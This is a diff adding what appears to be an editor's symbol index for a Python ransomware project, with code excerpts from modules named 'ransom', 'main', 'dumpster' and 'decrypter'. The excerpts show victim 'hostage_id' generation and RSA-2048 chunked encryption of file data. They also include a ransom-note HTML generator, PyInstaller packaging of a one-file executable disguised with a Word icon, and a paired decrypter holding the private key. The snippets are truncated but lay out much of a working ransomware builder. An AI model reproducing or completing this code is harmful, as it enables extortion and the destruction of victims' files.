@@ -1,0 +1,468 @@
+[
+    {
+        "label": "json",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "json",
+        "description": "json",
+        "detail": "json",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "serialization",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "hashes",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "serialization",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "hashes",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "serialization",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "hashes",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "serialization",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "hashes",
+        "importPath": "cryptography.hazmat.primitives",
+        "description": "cryptography.hazmat.primitives",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives",
+        "documentation": {}
+    },
+    {
+        "label": "padding",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "rsa",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "padding",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "rsa",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "padding",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "rsa",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "padding",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "rsa",
+        "importPath": "cryptography.hazmat.primitives.asymmetric",
+        "description": "cryptography.hazmat.primitives.asymmetric",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.primitives.asymmetric",
+        "documentation": {}
+    },
+    {
+        "label": "default_backend",
+        "importPath": "cryptography.hazmat.backends",
+        "description": "cryptography.hazmat.backends",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.backends",
+        "documentation": {}
+    },
+    {
+        "label": "default_backend",
+        "importPath": "cryptography.hazmat.backends",
+        "description": "cryptography.hazmat.backends",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.backends",
+        "documentation": {}
+    },
+    {
+        "label": "default_backend",
+        "importPath": "cryptography.hazmat.backends",
+        "description": "cryptography.hazmat.backends",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.backends",
+        "documentation": {}
+    },
+    {
+        "label": "default_backend",
+        "importPath": "cryptography.hazmat.backends",
+        "description": "cryptography.hazmat.backends",
+        "isExtraImport": true,
+        "detail": "cryptography.hazmat.backends",
+        "documentation": {}
+    },
+    {
+        "label": "uuid",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "uuid",
+        "description": "uuid",
+        "detail": "uuid",
+        "documentation": {}
+    },
+    {
+        "label": "subprocess",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "subprocess",
+        "description": "subprocess",
+        "detail": "subprocess",
+        "documentation": {}
+    },
+    {
+        "label": "webbrowser",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "webbrowser",
+        "description": "webbrowser",
+        "detail": "webbrowser",
+        "documentation": {}
+    },
+    {
+        "label": "read_configuration",
+        "kind": 2,
+        "importPath": "decrypter",
+        "description": "decrypter",
+        "peekOfCode": "def read_configuration():\n    with open(resource_path('config.json'), 'r') as f:\n        config = json.load(f)\n    return config['hostage_id'], config['private_key']\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)",
+        "detail": "decrypter",
+        "documentation": {}
+    },
+    {
+        "label": "resource_path",
+        "kind": 2,
+        "importPath": "decrypter",
+        "description": "decrypter",
+        "peekOfCode": "def resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)\ndef decrypt(private_key_pem, data):\n    try:\n        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())\n        decrypted_chunks = []",
+        "detail": "decrypter",
+        "documentation": {}
+    },
+    {
+        "label": "decrypt",
+        "kind": 2,
+        "importPath": "decrypter",
+        "description": "decrypter",
+        "peekOfCode": "def decrypt(private_key_pem, data):\n    try:\n        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())\n        decrypted_chunks = []\n        for i in range(0, len(data), 256):  # RSA 2048 key size / 8 = 256 bytes\n            chunk = data[i:i+256]\n            decrypted_chunk = private_key.decrypt(\n                chunk,\n                padding.OAEP(\n                    mgf=padding.MGF1(algorithm=hashes.SHA256()),",
+        "detail": "decrypter",
+        "documentation": {}
+    },
+    {
+        "label": "root_path",
+        "kind": 5,
+        "importPath": "decrypter",
+        "description": "decrypter",
+        "peekOfCode": "root_path = r'C:\\Users\\Usuario\\Desktop\\GitHub_Projects\\ransomware\\files'\ndef read_configuration():\n    with open(resource_path('config.json'), 'r') as f:\n        config = json.load(f)\n    return config['hostage_id'], config['private_key']\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")",
+        "detail": "decrypter",
+        "documentation": {}
+    },
+    {
+        "label": "generate_hostage_id",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def generate_hostage_id():\n    return str(uuid.uuid4())\ndef generate_rsa_key():\n    key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n    )\n    return key\ndef get_public_key(key):",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "generate_rsa_key",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def generate_rsa_key():\n    key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n    )\n    return key\ndef get_public_key(key):\n    public_key = key.public_key().public_bytes(\n        encoding=serialization.Encoding.PEM,",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "get_public_key",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def get_public_key(key):\n    public_key = key.public_key().public_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PublicFormat.SubjectPublicKeyInfo\n    )\n    return public_key\ndef get_private_key(key):\n    private_key = key.private_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PrivateFormat.TraditionalOpenSSL,",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "get_private_key",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def get_private_key(key):\n    private_key = key.private_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PrivateFormat.TraditionalOpenSSL,\n        encryption_algorithm=serialization.NoEncryption()\n    )\n    with open(f\"privatekey-{id}\", 'wb') as file:\n        file.write(private_key)\n    return private_key\ndef encrypt(public_key_pem, data):",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "encrypt",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def encrypt(public_key_pem, data):\n    try:\n        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())\n        encrypted_chunks = []\n        chunk_size = 190  # Reduced size to fit padding requirements\n        for i in range(0, len(data), chunk_size):\n            chunk = data[i:i+chunk_size]\n            print(f\"Encrypting chunk {i//chunk_size}: {chunk}\")\n            encrypted_chunk = public_key.encrypt(\n                chunk,",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "decrypt",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def decrypt(private_key_pem, data):\n    try:\n        private_key = serialization.load_pem_private_key(private_key_pem, password=None, backend=default_backend())\n        decrypted_chunks = []\n        for i in range(0, len(data), 256):  # RSA 2048 key size / 8 = 256 bytes\n            chunk = data[i:i+256]\n            print(f\"Decrypting chunk {i//256}: {chunk[:16]}...\")  # Print a snippet for readability\n            decrypted_chunk = private_key.decrypt(\n                chunk,\n                padding.OAEP(",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "generate_html",
+        "kind": 2,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "def generate_html(hostage_id):\n    html_string = f\"\"\"\n                    <!DOCTYPE html>\n                <html lang=\"en\">\n                <head>\n                    <meta charset=\"UTF-8\">\n                    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n                    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css\" integrity=\"sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN\" crossorigin=\"anonymous\">\n                    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js\" integrity=\"sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+\" crossorigin=\"anonymous\"></script>\n                    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL\" crossorigin=\"anonymous\"></script>",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "root_path",
+        "kind": 5,
+        "importPath": "dumpster",
+        "description": "dumpster",
+        "peekOfCode": "root_path = r'C:\\Users\\Usuario\\Desktop\\GitHub_Projects\\ransomware\\files'\ndef generate_hostage_id():\n    return str(uuid.uuid4())\ndef generate_rsa_key():\n    key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n    )\n    return key",
+        "detail": "dumpster",
+        "documentation": {}
+    },
+    {
+        "label": "generate_hostage_id",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def generate_hostage_id():\n    return str(uuid.uuid4())\ndef write_configuration(hostage_id, public_key):\n    config = {\n        'hostage_id': hostage_id,\n        'public_key': public_key.decode()\n    }\n    config_path = os.path.join(root_path, 'config.json')\n    with open(config_path, 'w') as f:\n        json.dump(config, f)",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "write_configuration",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def write_configuration(hostage_id, public_key):\n    config = {\n        'hostage_id': hostage_id,\n        'public_key': public_key.decode()\n    }\n    config_path = os.path.join(root_path, 'config.json')\n    with open(config_path, 'w') as f:\n        json.dump(config, f)\n    return config_path\ndef generate_rsa_key():",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "generate_rsa_key",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def generate_rsa_key():\n    key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n    )\n    return key\ndef get_public_key(key):\n    public_key = key.public_key().public_bytes(\n        encoding=serialization.Encoding.PEM,",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "get_public_key",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def get_public_key(key):\n    public_key = key.public_key().public_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PublicFormat.SubjectPublicKeyInfo\n    )\n    return public_key\ndef get_private_key(key, hostage_id):\n    executable_dir = os.path.join(root_path, hostage_id)\n    private_key = key.private_bytes(\n        encoding=serialization.Encoding.PEM,",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "get_private_key",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def get_private_key(key, hostage_id):\n    executable_dir = os.path.join(root_path, hostage_id)\n    private_key = key.private_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PrivateFormat.TraditionalOpenSSL,\n        encryption_algorithm=serialization.NoEncryption()\n    )\n    os.makedirs(executable_dir, exist_ok=True)\n    with open(os.path.join(executable_dir,f\"privatekey-{hostage_id}\"), 'wb') as file:\n        file.write(private_key)",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "generate_executable",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def generate_executable(script_path, hostage_id,config_path):\n    executable_dir = os.path.join(root_path, hostage_id)\n    os.makedirs(executable_dir, exist_ok=True)  # Crea la carpeta si no existe\n    subprocess.run([sys.executable, '-m', 'PyInstaller', '--onefile', '--console', '--add-data',f'{config_path};.',  f'--icon={os.path.join(root_path,\"WINWORD_1.ico\")}', script_path], cwd=executable_dir, check=True, shell=True)\ndef generate_ransomware():\n    private_key = generate_rsa_key()\n    public_key = get_public_key(private_key)\n    hostage_id = generate_hostage_id()\n    private_key_pem = get_private_key(private_key, hostage_id)\n    config_path= write_configuration(hostage_id,public_key)",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "generate_ransomware",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def generate_ransomware():\n    private_key = generate_rsa_key()\n    public_key = get_public_key(private_key)\n    hostage_id = generate_hostage_id()\n    private_key_pem = get_private_key(private_key, hostage_id)\n    config_path= write_configuration(hostage_id,public_key)\n    generate_executable(f\"{os.path.join(root_path,\"ransom.py\")}\", hostage_id,config_path)\ndef load_key(pem_file_path):\n    with open(pem_file_path, 'r') as archivo:\n        private_key = archivo.read()",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "load_key",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def load_key(pem_file_path):\n    with open(pem_file_path, 'r') as archivo:\n        private_key = archivo.read()\n    return private_key\ndef generate_decrypter(hostage_id):\n    path = f\"{root_path}/{hostage_id}/privatekey-{hostage_id}\"\n    private_key = load_key(path)\n    config = {\n        'hostage_id': hostage_id,\n        'private_key': private_key",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "generate_decrypter",
+        "kind": 2,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "def generate_decrypter(hostage_id):\n    path = f\"{root_path}/{hostage_id}/privatekey-{hostage_id}\"\n    private_key = load_key(path)\n    config = {\n        'hostage_id': hostage_id,\n        'private_key': private_key\n    }\n    config_path = os.path.join(root_path, 'config.json')\n    with open(config_path, 'w') as f:\n        json.dump(config, f)",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "file_path",
+        "kind": 5,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "file_path = os.path.abspath(__file__)\nroot_path = os.path.dirname(file_path)\nprint(root_path)\ndef generate_hostage_id():\n    return str(uuid.uuid4())\ndef write_configuration(hostage_id, public_key):\n    config = {\n        'hostage_id': hostage_id,\n        'public_key': public_key.decode()\n    }",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "root_path",
+        "kind": 5,
+        "importPath": "main",
+        "description": "main",
+        "peekOfCode": "root_path = os.path.dirname(file_path)\nprint(root_path)\ndef generate_hostage_id():\n    return str(uuid.uuid4())\ndef write_configuration(hostage_id, public_key):\n    config = {\n        'hostage_id': hostage_id,\n        'public_key': public_key.decode()\n    }\n    config_path = os.path.join(root_path, 'config.json')",
+        "detail": "main",
+        "documentation": {}
+    },
+    {
+        "label": "read_configuration",
+        "kind": 2,
+        "importPath": "ransom",
+        "description": "ransom",
+        "peekOfCode": "def read_configuration():\n    with open(resource_path('config.json'), 'r') as f:\n        config = json.load(f)\n    return config['hostage_id'], config['public_key']\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)",
+        "detail": "ransom",
+        "documentation": {}
+    },
+    {
+        "label": "resource_path",
+        "kind": 2,
+        "importPath": "ransom",
+        "description": "ransom",
+        "peekOfCode": "def resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)\ndef generate_html(hostage_id):\n    html_string = f\"\"\"\n                    <!DOCTYPE html>\n                <html lang=\"en\">",
+        "detail": "ransom",
+        "documentation": {}
+    },
+    {
+        "label": "generate_html",
+        "kind": 2,
+        "importPath": "ransom",
+        "description": "ransom",
+        "peekOfCode": "def generate_html(hostage_id):\n    html_string = f\"\"\"\n                    <!DOCTYPE html>\n                <html lang=\"en\">\n                <head>\n                    <meta charset=\"UTF-8\">\n                    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n                    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css\" integrity=\"sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN\" crossorigin=\"anonymous\">\n                    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js\" integrity=\"sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+\" crossorigin=\"anonymous\"></script>\n                    <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL\" crossorigin=\"anonymous\"></script>",
+        "detail": "ransom",
+        "documentation": {}
+    },
+    {
+        "label": "encrypt",
+        "kind": 2,
+        "importPath": "ransom",
+        "description": "ransom",
+        "peekOfCode": "def encrypt(public_key_pem, data):\n    try:\n        public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())\n        encrypted_chunks = []\n        chunk_size = 190 \n        for i in range(0, len(data), chunk_size):\n            chunk = data[i:i+chunk_size]\n            encrypted_chunk = public_key.encrypt(\n                chunk,\n                padding.OAEP(",
+        "detail": "ransom",
+        "documentation": {}
+    },
+    {
+        "label": "root_path",
+        "kind": 5,
+        "importPath": "ransom",
+        "description": "ransom",
+        "peekOfCode": "root_path = r'C:\\Users\\Usuario\\Desktop\\GitHub_Projects\\ransomware\\files'\ndef read_configuration():\n    with open(resource_path('config.json'), 'r') as f:\n        config = json.load(f)\n    return config['hostage_id'], config['public_key']\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")",
+        "detail": "ransom",
+        "documentation": {}
+    }
+]
